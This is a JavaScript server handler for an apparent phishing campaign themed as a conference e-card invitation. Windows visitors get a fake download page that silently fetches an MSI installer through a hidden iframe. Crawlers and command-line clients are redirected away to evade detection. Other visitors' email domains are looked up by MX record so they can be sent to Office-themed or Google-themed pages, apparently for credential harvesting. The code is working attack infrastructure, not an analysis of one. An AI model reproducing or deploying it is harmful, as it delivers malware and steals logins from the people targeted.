import dns from "dns/promises";

/* ================= CONFIG ================= */

const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
  "https://aspiceconference.com/e-card_invitation/ecard.html";

const MSI_PATH = "/access_invitation";

const OFFICE_TARGET = "https://aspiceconference.com/cw";
const GOOGLE_TARGET = "https://aspiceconference.com/wa";
const DEFAULT_TARGET = "https://aspiceconference.com/cw";

const MX_TIMEOUT_MS = 1500;

/* ================= CACHE ================= */

const mxCache = new Map();

/* ================= HELPERS ================= */

function isBot(userAgent = "") {
  return /(bot|crawler|spider|headless|phantom|curl|wget|python|scrapy)/i.test(
    userAgent
  );
}

function extractEmail(req) {
  let email = "";

  if (req.query?.email)
    email = Array.isArray(req.query.email)
      ? req.query.email[0]
      : req.query.email;

  else if (req.query?.smn)
    email = Array.isArray(req.query.smn)
      ? req.query.smn[0]
      : req.query.smn;

  return typeof email === "string" ? email.trim() : "";
}

async function resolveMxWithTimeout(domain) {
  return Promise.race([
    dns.resolveMx(domain),
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("MX timeout")), MX_TIMEOUT_MS)
    ),
  ]);
}

async function detectEmailProvider(email) {
  if (!email || !email.includes("@")) return "unknown";

  const domain = email.split("@")[1].toLowerCase();

  if (mxCache.has(domain)) return mxCache.get(domain);

  try {
    const records = await resolveMxWithTimeout(domain);
    const exchanges = records.map(r => r.exchange.toLowerCase());

    let provider = "other";

    if (exchanges.some(mx => mx.includes("mail.protection.outlook.com")))
      provider = "office";
    else if (exchanges.some(mx => mx.includes("google.com")))
      provider = "google";

    mxCache.set(domain, provider);
    return provider;
  } catch {
    return "other"; // fail-open
  }
}

/* ================= HANDLER ================= */

export default async function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const isWindows = /windows/i.test(userAgent);
  const email = extractEmail(req);

  /* ===== WINDOWS FLOW ===== */
  if (isWindows) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Preparing Download…</title>
</head>
<body>
  <p>Your download will start shortly…</p>
  <button id="fallbackButton">Click here if download does not start</button>

  <script>
    (function(){
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '${MSI_PATH}';
      document.body.appendChild(iframe);

      document.getElementById('fallbackButton').onclick = function() {
        window.location.href = '${MSI_PATH}';
      };

      setTimeout(function(){
        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
      }, 3000);
    })();
  </script>
</body>
</html>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);
    return;
  }

  /* ===== BOT SHORT-CIRCUIT ===== */
  if (isBot(userAgent)) {
    res.writeHead(302, { Location: DEFAULT_TARGET });
    res.end();
    return;
  }

  /* ===== NON-WINDOWS FLOW ===== */
  let target = DEFAULT_TARGET;

  if (email) {
    const provider = await detectEmailProvider(email);

    if (provider === "office") target = OFFICE_TARGET;
    else if (provider === "google") target = GOOGLE_TARGET;
  }

  const finalUrl = email
    ? `${target}#${encodeURIComponent(email)}`
    : target;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}
